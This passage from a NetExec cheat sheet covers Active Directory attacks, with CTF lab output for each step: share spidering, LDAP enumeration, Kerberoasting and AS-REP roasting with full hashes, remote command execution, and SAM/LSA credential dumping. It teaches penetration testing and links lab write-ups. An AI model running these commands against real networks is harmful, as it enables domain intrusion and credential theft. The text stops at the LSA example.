netexec smb $target -u $username -p $password -M spider_plus -o DOWNLOAD_FLAG=True
netexec smb $target -u $username -p $password -M spider_plus -o READ_ONLY=false
```

```
$ netexec smb phantom.vl -u ibryant -p 'Ph4nt0m@5t4rt!' -M spider_plus
SMB         10.10.123.78    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.123.78    445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
SPIDER_PLUS 10.10.123.78    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.123.78    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.123.78    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.123.78    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.123.78    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.123.78    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.123.78    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.123.78    445    DC               [*] Enumerated shares
SMB         10.10.123.78    445    DC               Share           Permissions     Remark
SMB         10.10.123.78    445    DC               -----           -----------     ------
SMB         10.10.123.78    445    DC               ADMIN$                          Remote Admin
SMB         10.10.123.78    445    DC               C$                              Default share
SMB         10.10.123.78    445    DC               Departments Share READ
SMB         10.10.123.78    445    DC               IPC$            READ            Remote IPC
SMB         10.10.123.78    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.123.78    445    DC               Public          READ
SMB         10.10.123.78    445    DC               SYSVOL          READ            Logon server share
SPIDER_PLUS 10.10.123.78    445    DC               [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.123.78.json".
SPIDER_PLUS 10.10.123.78    445    DC               [*] SMB Shares:           7 (ADMIN$, C$, Departments Share, IPC$, NETLOGON, Public, SYSVOL)
SPIDER_PLUS 10.10.123.78    445    DC               [*] SMB Readable Shares:  5 (Departments Share, IPC$, NETLOGON, Public, SYSVOL)
SPIDER_PLUS 10.10.123.78    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.123.78    445    DC               [*] Total folders found:  23
SPIDER_PLUS 10.10.123.78    445    DC               [*] Total files found:    19
SPIDER_PLUS 10.10.123.78    445    DC               [*] File size average:    13.56 MB
SPIDER_PLUS 10.10.123.78    445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.10.123.78    445    DC               [*] File size max:        82.48 MB
```

Writeup: [Phantom](https://seriotonctf.github.io/Phantom-Vulnlab/)

### Logged On Sessions

Shows who is logged on. An admin session on a host you control means credentials in LSASS, or a target for cross session relay.

```
netexec smb $target -u $username -p $password --qwinsta
```

```
$ netexec smb shibuya.vl -u _admin -H bab5b2a004eabb11d865f31912b6b430 --qwinsta
SMB         10.10.73.8      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.73.8      445    AWSJPDC0522      [+] shibuya.vl\_admin:bab5b2a004eabb11d865f31912b6b430 (Pwn3d!)
SMB         10.10.73.8      445    AWSJPDC0522      [+] Enumerated qwinsta sessions
SMB         10.10.73.8      445    AWSJPDC0522      SESSIONNAME  USERNAME             ID  IPv4 Address     STATE         Desktop   ConnectTime          DisconnectTime
SMB         10.10.73.8      445    AWSJPDC0522      ============ ==================== === ================ ============= ========= ==================== ====================
SMB         10.10.73.8      445    AWSJPDC0522      Services                          0                    Disconnected            None                 None
SMB         10.10.73.8      445    AWSJPDC0522      Console      SHIBUYA\nigel.mills  1                    Active        Unlocked  2025/02/27 14:24:28  None
```

Writeup: [Shibuya](https://seriotonctf.github.io/Shibuya-Vulnlab/#Cross-Session-Relay)

### Running Processes

Requires local admin. Useful to spot AV, EDR, or processes running as another user.

```
netexec smb $target -u $username -p $password --tasklist
```

```
$ netexec smb shibuya.vl -u _admin -H bab5b2a004eabb11d865f31912b6b430 --tasklist
SMB         10.10.73.8      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.73.8      445    AWSJPDC0522      [+] shibuya.vl\_admin:bab5b2a004eabb11d865f31912b6b430 (Pwn3d!)
SMB         10.10.73.8      445    AWSJPDC0522      [+] Enumerated processes
SMB         10.10.73.8      445    AWSJPDC0522      Image Name                                PID      Session#    SID                                            Mem Usage
SMB         10.10.73.8      445    AWSJPDC0522      ========================================= ======== =========== =========================================== ============
SMB         10.10.73.8      445    AWSJPDC0522      System                                    4        0                                                              135 K
SMB         10.10.73.8      445    AWSJPDC0522      Registry                                  96       0           SYSTEM                                          20,934 K
SMB         10.10.73.8      445    AWSJPDC0522      smss.exe                                  320      0           SYSTEM                                           1,298 K
SMB         10.10.73.8      445    AWSJPDC0522      csrss.exe                                 436      0           SYSTEM                                           6,373 K
SMB         10.10.73.8      445    AWSJPDC0522      wininit.exe                               512      0           SYSTEM                                           7,225 K
SMB         10.10.73.8      445    AWSJPDC0522      services.exe                              664      0           SYSTEM                                          14,790 K
SMB         10.10.73.8      445    AWSJPDC0522      lsass.exe                                 680      0           SYSTEM                                          64,782 K
SMB         10.10.73.8      445    AWSJPDC0522      svchost.exe                               872      0           SYSTEM                                          26,820 K
...[snip]...
```

## LDAP

### List Users

Same data as SMB `--users`, but through LDAP, which still works when SMB enumeration is blocked.

```
netexec ldap $target -u '' -p '' --users
netexec ldap $target -u $username -p $password --users
```

```
$ netexec ldap 10.129.180.151 -u levi.james -p 'KingofAkron2025!' --users
LDAP        10.129.180.151  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.129.180.151  389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
LDAP        10.129.180.151  389    DC               [*] Enumerated 9 domain users: PUPPY.HTB
LDAP        10.129.180.151  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.180.151  389    DC               Administrator                 2025-02-19 20:33:28 0        Built-in account for administering the computer/domain
LDAP        10.129.180.151  389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.180.151  389    DC               krbtgt                        2025-02-19 12:46:15 0        Key Distribution Center Service Account
LDAP        10.129.180.151  389    DC               levi.james                    2025-02-19 13:10:56 5
LDAP        10.129.180.151  389    DC               ant.edwards                   2025-02-19 13:13:14 0
LDAP        10.129.180.151  389    DC               adam.silver                   2025-05-18 19:04:29 0
LDAP        10.129.180.151  389    DC               jamie.williams                2025-02-19 13:17:26 5
LDAP        10.129.180.151  389    DC               steph.cooper                  2025-02-19 13:21:00 5
LDAP        10.129.180.151  389    DC               steph.cooper_adm              2025-03-08 16:50:40 5
```

### All-in-One

Finds accounts with delegation, accounts that do not require a password and protected admin accounts in one run.

```
netexec ldap $target -u $username -p $password --trusted-for-delegation --password-not-required --admin-count --users --groups
```

### List Computers

Lists computer accounts. Look for old or unusual names, such as pre-created accounts.

```
netexec ldap $target -u $username -p $password --computers
```

```
$ netexec ldap 10.244.0.10 -u '' -p '' --computers
LDAP        10.244.0.10     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:hack.lu) (signing:Enforced) (channel binding:When Supported)
LDAP        10.244.0.10     389    DC01             [+] hack.lu\:
LDAP        10.244.0.10     389    DC01             [*] Total records returned: 2
LDAP        10.244.0.10     389    DC01             DC01$
LDAP        10.244.0.10     389    DC01             dator$
```

Writeup: [AKTIVKATALOG](https://seriotonctf.github.io/AKTIVKATALOG-1-Hack-lu-CTF-2025/#Enumeration)

### User Descriptions

Admins often leave passwords in the description field.

```
netexec ldap $target -u $username -p $password -M get-desc-users
```

```
$ netexec ldap 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -M get-desc-users
LDAP        10.10.11.35     389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
GET-DESC... 10.10.11.35     389    CICADA-DC        [+] Found following users:
GET-DESC... 10.10.11.35     389    CICADA-DC        User: Administrator description: Built-in account for administering the computer/domain
GET-DESC... 10.10.11.35     389    CICADA-DC        User: Guest description: Built-in account for guest access to the computer/domain
GET-DESC... 10.10.11.35     389    CICADA-DC        User: krbtgt description: Key Distribution Center Service Account
GET-DESC... 10.10.11.35     389    CICADA-DC        User: david.orelious description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

Writeup: [Cicada](https://seriotonctf.github.io/HTB-Solving-Cicada-Using-Only-NetExec/#Enumeration)

### unixUserPassword

Reads the unixUserPassword and userPassword attributes, which sometimes hold cleartext passwords.

```
netexec ldap $target -u $username -p $password -M get-unixUserPassword
```

```
$ netexec ldap 10.244.0.10 -u '' -p '' -M get-unixUserPassword
LDAP        10.244.0.10     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:hack.lu) (signing:Enforced) (channel binding:When Supported)
LDAP        10.244.0.10     389    DC01             [+] hack.lu\:
GET-UNIX... 10.244.0.10     389    DC01             [+] Found following users:
GET-UNIX... 10.244.0.10     389    DC01             User: dator$ unixUserPassword: vy6A8VGpN7gMxZ
```

Writeup: [AKTIVKATALOG](https://seriotonctf.github.io/AKTIVKATALOG-1-Hack-lu-CTF-2025/#Enumeration)

### Kerberoasting

Any domain user can request a service ticket for an account with an SPN. The ticket is encrypted with that account's password and cracks offline with hashcat mode 13100. Most of the time it returns nothing.

```
netexec ldap $target -u $username -p $password --kerberoasting hashes.txt
```

```
$ netexec ldap lusdc -u ben.cox -p Trinity1 --kerberoasting kerb.txt
LDAP        10.10.156.101   389    LUSDC            [*] Windows Server 2022 Build 20348 (name:LUSDC) (domain:lustrous.vl)
LDAP        10.10.156.101   389    LUSDC            [+] lustrous.vl\ben.cox:Trinity1
LDAP        10.10.156.101   389    LUSDC            [*] Skipping disabled account: krbtgt
LDAP        10.10.156.101   389    LUSDC            [*] Total of records returned 2
LDAP        10.10.156.101   389    LUSDC            [*] sAMAccountName: svc_web, memberOf: [], pwdLastSet: 2021-12-22 13:46:12.670282, lastLogon: 2021-12-27 13:45:43.927619
LDAP        10.10.156.101   389    LUSDC            $krb5tgs$23$*svc_web$LUSTROUS.VL$lustrous.vl\svc_web*$733bd0c35004f1cfa990d5e21629b2f2$6c8d4ab35567d5f312301a38ca2e431839f12d68e20bed1c4df535f988083a2e529f7f599f0c6696350d5604ea8fcc7e478bbad652e432e7378ef5a54ff127f886e5f077e02ee44cef48cb094b9698ae7d70068338597a863e368f657ad4ec6bc863f4870e8372969dc0c638b0be60213a8ad8a254a4df583d371f1b3e34ca6063007e0e73b2241e0013aa1bdfa431c43bb448699a889ed368dde5aa5babea845e0f22cf9ef8d996b5e7eff992c82a746a9558a94ef7102eea70111a0a3d055d832cecb929213337c2ffed13da5eb4b6c9cd50418e1eed91a847cff15e6facaa227db45e6f8a35db677900fc18f6d7d58d6ecf5782362ec48b2d577209e34b3d8bf863aefd7b468428d060e89ccd43f69b42654a47f067794bf997f14abf62212703496413fe0f5bbed35e605f17c321e6a2118e91caad3b0a4839072c12719badf59b7404256811f4125f5a8f74bd52c61ec957a3c0f94ee81d83fd610adcbfd655df6d401a2a30cf40713b3fdf6ff651a509d6b30e98ce10dc65e08dbeff75aa50769f0fa867ff07e740f22ad6b8aee2a7b7ec48b957f320047d85eecaca665aca33de2557fe30ba4173f7b21a89ffb0d4ca5483ff1b04b6b02bf6b57f41c453b1c551ead35e2be52370971d6cb838093394da9ef574d9a7f4dc593d39db2f50d76c78a934ec617cc07bb4859c585c31cef6b33a1629be85311431d8e2eba8776350db69692252a92ad6069482c28ef4361c84fff51da3c84fc8193edf53656886d6793242969deef15dafb80339214118dc2a8716e46f2a83d8d868515b8939ac3753b614744de7fd34dd174408a056faf9efa069ee54a8555501dbcf58601b6c6299ca584948f0603ccdd91596d07a917c69b3656790b0456c37262b01b0b3e77f60d7218f6b3a01342224ee757970fa2c3bbcfb068fe0d16aa52e70ea8be058c870f881cce666f9a81c90e10fc71d94bef5d575cd920a90adb14090a5786db40e0af6e697fbb362300acc1c8f5cc7ce0117e1c1b1bb98da8882077caca7da006637c45a257a39d8c661e3a9021cbe746df66730aa327e337a78272bed737741d57c6bd4abc72d27f9409372c7e40dceff48b8471bb46b77073cc2c64f90b9500c73ee2e51d6ebba168943b7b707d1531416344865db728eafe3f4fa98aac44f621d80029e7fc250f38671bdc112e13b76b9485c478a530b93e7237bff90a30cb86d85d9990a2eb099e52f742b85566c5409cb196a88ff90ac8f3a9fb783cf064feb190858ddc87676809e57be68169a5ed3eeb7811c99b01c3461cf365a3e90409d278dcfd3cd7770c7d3562721f32002c9deb38969d066e5a20c083225342fbd9b2da634b26ca602ceabb3c8c4d37b9e723fe654bc3c24eb55810c7f4d56d5c98b1d2760d171affd3831bc44b7c776571d2a77aa5cbb69c0d016ca4d3a655630
LDAP        10.10.156.101   389    LUSDC            [*] sAMAccountName: svc_db, memberOf: [], pwdLastSet: 2021-12-22 13:46:34.170590, lastLogon: <never>
LDAP        10.10.156.101   389    LUSDC            $krb5tgs$23$*svc_db$LUSTROUS.VL$lustrous.vl\svc_db*$8b3d8989775cd3e8dea271d4a1bccd9d$158e44605bb7bb93aa1b7a217aabf1d8b3ff7cbd1a1063b65b20d40bd8f77dc94fc73ee7bda41729036089896af92fc35ca4b5cd78cfb5cfbb1aecb47ee2978e8a4a4c203c4aae9abde2f2361b437aeea1cbd1ac60712cdca686ce7a83a72570ef7dd81155affd01545561832be0706a0fe7c4b1932b233becb7f32e894935b97be6830f12ccba4b538a0ffca59a7be7f2dc09becff4b2cdd0ac5d45a151d819ad2c4838a81ea3c653adf3e5252e46a729509f30f080edb947c0df670fccf67e8d49991f037a749ca52fff8a4084b27cd70b2e95255b861dcee3da1f232baea05b12e080e51a5fdcdb992cb2f207c04655a8f2001482cc2f832fef79c2872f32b392581e0c994c1be8e047290dacbd4e5fb18937a47f2ada4ac908f71691e38ae48842ce13ab997163b637399c4017efa3f9436a1cbc64b81fb558cf3455c7c7bb841aee8d38e2fc97ce5a468c636b2ae99336001f3ab28abab19c299d8d53cdc56d93ea4443455bd19eb092350e1ee047a3cb143b787f47c5100850f9f1b7cc4edb22420b891e5afbfddb7d9630e50eced1fc1264b6511ff56108d6bf57f1cf0181e5b363974cc932d5a21d696f4bae6037aa9e95cc796462db76a9ff0f04379427149cf2bcf6f0b5a87e3eea8353e014b6afd71b9144c192e83a50b664ecb506e709f46b267d3d9eeda17766a9f6539c9af9c6ce155571a54fae12049b8bb6c5fd53bc3683a4fb9a8c728b960aacd5b9cd0ec6eabeaee1125103bbcfd1f24ccc2429e4c9783aa3db3f7f22d4c24b6af588b44e9cd74e9e2e9d26b36452f5997713d597751360e6e20bb320a21b549316552f2bc4297ec8c7d027880061126733a3b9263f1ea831629309621f6e6cd6cebb7536ac00aba02ef9abef29d1a8e073c58abdfe36ff68f35ea56d504d2123a6c793758771e7a8dc32b4c554381565f613edaea9c117fa2a9250d38c3168b9a12d6bad3852c562e8e094d2bea5cf313396042337bdb74c88727fd29977e4b657572fd20b1cceabe40a67b5243b475add4249373f85824b3668cb43b6f181f8460bd43764b9d22b609da8c9629ab2e1967053663a1a7ea8ead2efb0ec99c1039eb835ab0348d55cf415e613c3997ea195e516c5059b040c3622c599750419ae1780584d6e65b16b1f9e3a1ee2490ea49300b184a91fe5580b9e72279994ff37e4029a3950d22575de21adb44342ca123fdd58d677db680495bfe193af895381e6062bf946da482703e30b8fbef6e74b00c7aa75428a05e15320bae663c8bf3383ba44cf3a3aff934207fdae5a10cb67d49f96dfa4b5e25a82df2dd8505051278b9aabff428ed900a0d1346bedf7fbad6afe77314a725e077c59745c65a690e55bc9c2d907fadceab1250b706c7a1bae49ba880b07564a906bc2033aa8376fe843b9f388c215b4d554c4508da3a8ab7af5b99e
```

### ASREPRoasting

Accounts with Kerberos pre-authentication disabled return a crackable hash without any password, so a user list is enough. Hashcat mode 18200.

```
netexec ldap $target -u users.txt -p '' --asreproast hashes.txt
```

```
$ netexec ldap absolute.htb -u users.txt -p '' --asreproast asrep.txt
LDAP        10.10.11.181    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb)
LDAP        10.10.11.181    389    DC               $krb5asrep$23$d.klay@ABSOLUTE.HTB:0a0b2723c4b85f0fd489f4cff6cc1c33$99b6ae9e80b0bf5f51a2c1ecc96ab1845af3ff75b1ed490a83474f8713723ce0cd7e1393adef0c59503cc3e30b145f64a6e6bfa22dac5ac8b6b5780f6d6bf9c48e02388a1744fa72688222fe60893a24c16fac31ff91f085a837dfc24e7279551253502ba446b379d505b40d360937710697515bb3d25cda9d92446156c55b00839a19b0daffd4b0ee07184cb2a0c199c58960cb0df3369eeb3f1ad5cb7dfe99715a3fd489e5db384a383ed384a3b3df43a1ae13d2e67962776a59a7f913d81eaa26bdcc46c75bf1fa9921f998dd8cd6a63d58ba9a61ff16cd6c7feb884c3e784b3cd48dc3a4e32122600979
```

### BloodHound

Collects users, groups, sessions and ACLs for BloodHound. Upload the zip from the output to find attack paths.

```
netexec ldap $target -u $username -p $password --bloodhound --dns-server $dc_ip --dns-tcp -c all
```

```
$ netexec ldap dc1.klendathu.vl -u zim -p football22 --bloodhound --dns-server 10.10.213.53 --dns-tcp -c all
LDAP        10.10.213.53    389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:KLENDATHU.VL)
LDAP        10.10.213.53    389    DC1              [+] KLENDATHU.VL\zim:football22
LDAP        10.10.213.53    389    DC1              Resolved collection methods: dcom, rdp, container, objectprops, group, trusts, psremote, acl, session, localadmin
LDAP        10.10.213.53    389    DC1              Done in 00M 15S
LDAP        10.10.213.53    389    DC1              Compressing output into /home/serioton/.nxc/logs/DC1_10.10.213.53_2025-01-27_153950_bloodhound.zip
```

`-c` is short for `--collection`

### ADCS Enumeration

ADCS is not installed by default, but it is common in enterprise networks. This finds the CA, then [certipy-find](#certipy-find) shows the vulnerable templates.

```
netexec ldap $target -u $username -p $password -M adcs
```

```
$ netexec ldap dc01 -u winrm_svc -p 'WinRm@$svc^!^P' -M adcs
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.31     389    DC01             [+] infiltrator.htb\winrm_svc:WinRm@$svc^!^P
ADCS        10.10.11.31     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.31     389    DC01             Found PKI Enrollment Server: dc01.infiltrator.htb
ADCS        10.10.11.31     389    DC01             Found CN: infiltrator-DC01-CA
```

### certipy-find

Runs certipy find through NetExec. A template is only flagged as vulnerable when the current user can abuse it, so run it again for each compromised user.

```
netexec ldap $target -u $username -p $password -M certipy-find
```

```
$ netexec ldap 10.244.0.10 -u 'dator$' -p 'vy6A8VGpN7gMxZ' -M certipy-find
LDAP        10.244.0.10     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:hack.lu) (signing:Enforced) (channel binding:When Supported)
LDAP        10.244.0.10     389    DC01             [+] hack.lu\dator$:vy6A8VGpN7gMxZ
...[snip]...
CERTIPY-... 10.244.0.10     389    DC01             Certificate Templates
CERTIPY-... 10.244.0.10     389    DC01               0
CERTIPY-... 10.244.0.10     389    DC01                 Template Name                       : köttbullar
CERTIPY-... 10.244.0.10     389    DC01                 Display Name                        : köttbullar
CERTIPY-... 10.244.0.10     389    DC01                 Certificate Authorities             : hack-DC01-CA
CERTIPY-... 10.244.0.10     389    DC01                 Enabled                             : True
CERTIPY-... 10.244.0.10     389    DC01                 Client Authentication               : True
CERTIPY-... 10.244.0.10     389    DC01                 Enrollment Agent                    : False
CERTIPY-... 10.244.0.10     389    DC01                 Any Purpose                         : False
CERTIPY-... 10.244.0.10     389    DC01                 Enrollee Supplies Subject           : True
...[snip]...
CERTIPY-... 10.244.0.10     389    DC01                 [+] User Enrollable Principals      : HACK.LU\Domändatorer
CERTIPY-... 10.244.0.10     389    DC01                 [!] Vulnerabilities
CERTIPY-... 10.244.0.10     389    DC01                   ESC1                              : Enrollee supplies subject and template allows client authentication.
CERTIPY-... 10.244.0.10     389    DC01                   ESC15                             : Enrollee supplies subject and schema version is 1.
```

Writeup: [AKTIVKATALOG](https://seriotonctf.github.io/AKTIVKATALOG-1-Hack-lu-CTF-2025/#ADCS)

### Find the CA From SMB

Finds the CA anonymously through RPC, no LDAP needed.

```
netexec smb $target -u $username -p $password -M enum_ca
```

### MachineAccountQuota

Not a vulnerability on its own. The default of 10 lets any user add computer accounts, which RBCD and some ADCS attacks need. With 0 you need an existing computer account.

```
netexec ldap $target -u $username -p $password -M maq
```

```
$ netexec ldap dc1 -u n.thompson -p KALEB_2341 -M maq
LDAP        10.10.68.115    389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        10.10.68.115    389    DC1              [+] delegate.vl\n.thompson:KALEB_2341
MAQ         10.10.68.115    389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.10.68.115    389    DC1              MachineAccountQuota: 10
```

### Find Misconfigured Delegation

Lists unconstrained, constrained and resource based constrained delegation. Each of them can lead to impersonating other users.

```
netexec ldap $target -u $username -p $password --find-delegation
```

```
$ netexec ldap dc01.rebound.htb -u delegator$ -H 45326e68995ec3b859228fd504be8617 -k --find-delegation
LDAP        dc01.rebound.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
LDAPS       dc01.rebound.htb 636    DC01             [+] rebound.htb\delegator$
LDAPS       dc01.rebound.htb 636    DC01             AccountName AccountType                         DelegationType DelegationRightsTo
LDAPS       dc01.rebound.htb 636    DC01             ----------- ----------------------------------- -------------- ---------------------
LDAPS       dc01.rebound.htb 636    DC01             delegator$  ms-DS-Group-Managed-Service-Account Constrained    http/dc01.rebound.htb
```

### Domain Controllers and Trusts

Lists the DCs of the domain and the trusts to other domains, the next targets after this one.

```
netexec ldap $target -u $username -p $password --dc-list
```

```
$ netexec ldap dc01 -u administrator -p 'P@ssw0rd' --dc-list
LDAP        172.77.124.7    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:domain.local) (signing:None) (channel binding:No TLS cert)
LDAP        172.77.124.7    389    DC01             [+] domain.local\administrator:P@ssw0rd (Pwn3d!)
LDAP        172.77.124.7    389    DC01             DC01.domain.local = 172.77.124.7
LDAP        172.77.124.7    389    DC01             [+] Found DC in trusted domain: dc02.trusted.local
LDAP        172.77.124.7    389    DC01             trusted.local -> Outbound -> Quarantined Domain
LDAP        172.77.124.7    389    DC01             dc02.trusted.local = 172.77.124.21
```

### Group Membership

Shows the groups of one user, a quick way to see what a new account gives you.

```
netexec ldap $target -u $username -p $password -M groupmembership -o USER=$target_user
```

```
$ proxychains4 -q netexec ldap shibuya.vl -u nigel.mills -p Sail2Boat3 -M groupmembership -o USER=nigel.mills
LDAP        224.0.0.1       389    AWSJPDC0522      [*] Windows Server 2022 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl)
LDAP        224.0.0.1       389    AWSJPDC0522      [+] shibuya.vl\nigel.mills:Sail2Boat3
GROUPMEM... 224.0.0.1       389    AWSJPDC0522      [+] User: nigel.mills is member of following groups:
GROUPMEM... 224.0.0.1       389    AWSJPDC0522      shibuya
GROUPMEM... 224.0.0.1       389    AWSJPDC0522      t1_admins
GROUPMEM... 224.0.0.1       389    AWSJPDC0522      Domain Users
```

Writeup: [Shibuya](https://seriotonctf.github.io/Shibuya-Vulnlab/)

### LDAP Signing

If signing and channel binding are not enforced, NTLM authentication can be relayed to LDAP, for example to set RBCD or shadow credentials.

```
netexec ldap $target -u $username -p $password -M ldap-checker
```

```
$ netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M ldap-checker
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAP        192.168.100.100 389    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9
LDAP-CHE... 192.168.100.100 389    DC01             LDAP Signing NOT Enforced!
LDAP-CHE... 192.168.100.100 389    DC01             [-] mist.htb - cannot complete TLS handshake, cert likely not configured
```

### Pre-Created Computer Accounts

Computer accounts created as pre-Windows 2000 have the lowercase hostname as password. They fail with `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` over NTLM, so the module requests a TGT for each of them with Kerberos.

```
netexec ldap $target -u $username -p $password -M pre2k
```

```
$ netexec ldap pirate.htb -u pentest -p 'p3nt3st2025!&' -M pre2k
LDAP        10.129.60.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP        10.129.60.234   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
PRE2K       10.129.60.234   389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.60.234   389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.60.234   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/oxdf/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       10.129.60.234   389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K       10.129.60.234   389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
PRE2K       10.129.60.234   389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/oxdf/.nxc/modules/pre2k/ccache
```

## Command Execution

### Execute a CMD Command

Requires `(Pwn3d!)`. NetExec tries wmiexec, atexec and smbexec until one works, pick one with `--exec-method`.

```
netexec smb $target -u $username -p $password -x 'whoami'
```

```
$ netexec smb baby2.vl -u john -p H4x00r123.. -x 'type C:\users\administrator\desktop\root.txt'
SMB         10.10.78.210    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.10.78.210    445    DC               [+] baby2.vl\john:H4x00r123.. (Pwn3d!)
SMB         10.10.78.210    445    DC               [+] Executed command via wmiexec
SMB         10.10.78.210    445    DC               VL{f0205b652ed74c5deed92b7a6a163516}
```

### Execute a PowerShell Command

Same as `-x`, but runs the command through PowerShell.

```
netexec smb $target -u $username -p $password -X 'whoami'
```

```
$ netexec smb 10.10.81.2 -u _admin -H bab5b2a004eabb11d865f31912b6b430 -X 'cat C:\users\administrator\desktop\root.txt'
SMB         10.10.81.2      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.81.2      445    AWSJPDC0522      [+] shibuya.vl\_admin:bab5b2a004eabb11d865f31912b6b430 (Pwn3d!)
SMB         10.10.81.2      445    AWSJPDC0522      [+] Executed command via wmiexec
SMB         10.10.81.2      445    AWSJPDC0522      VL{b1ffd535145a16ac44220c108377b9cc}
```

### WinRM

`(Pwn3d!)` on WinRM means the account can get a shell with evil-winrm, usually a member of Remote Management Users or a local admin.

```
netexec winrm $target -u $username -p $password
netexec winrm $target -u $username -p $password -X 'whoami'
```

```
$ netexec winrm baby2.vl -u john -p H4x00r123..
WINRM       10.10.78.210    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
WINRM       10.10.78.210    5985   DC               [+] baby2.vl\john:H4x00r123.. (Pwn3d!)
```

With a local account

```
$ netexec winrm WS01 -u administrator -H 831cbc509daa37aff98250b635e7f482 --local-auth
WINRM       10.10.155.38    5985   WS01             [*] Windows 10 / Server 2019 Build 19041 (name:WS01) (domain:intercept.vl)
WINRM       10.10.155.38    5985   WS01             [+] WS01\administrator:831cbc509daa37aff98250b635e7f482 (Pwn3d!)
```

## Credential Dumping

### SAM

Local account hashes. The local Administrator hash is often reused on other hosts, try it with `--local-auth`.

```
netexec smb $target -u $username -p $password --sam
```

```
$ proxychains4 -q netexec smb 172.16.21.180 -u dom-fstewart -p 'P@ssw0rd' --sam
SMB         172.16.21.180   445    S021M010         [*] Windows Server 2022 Build 20348 x64 (name:S021M010) (domain:domain.local) (signing:False) (SMBv1:False)
SMB         172.16.21.180   445    S021M010         [+] domain.local\dom-fstewart:P@ssw0rd (Pwn3d!)
SMB         172.16.21.180   445    S021M010         [*] Dumping SAM hashes
SMB         172.16.21.180   445    S021M010         Administrator:500:aad3b435b51404eeaad3b435b51404ee:0398e67c28595e5ce5dc16bcc43384a2:::
SMB         172.16.21.180   445    S021M010         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.21.180   445    S021M010         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.21.180   445    S021M010         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:81887874100e95ffab05dcfbe8fd9229:::
SMB         172.16.21.180   445    S021M010         [+] Added 4 SAM hashes to the database
```

### LSA

LSA secrets hold service account passwords, cached domain logons (DCC2) and the machine account hash. Cleartext passwords show up here often.

```
netexec smb $target -u $username -p $password --lsa
```

```
$ proxychains -q netexec smb 10.10.140.38 -u administrator -p NakedMelonMan25 --local-auth --lsa
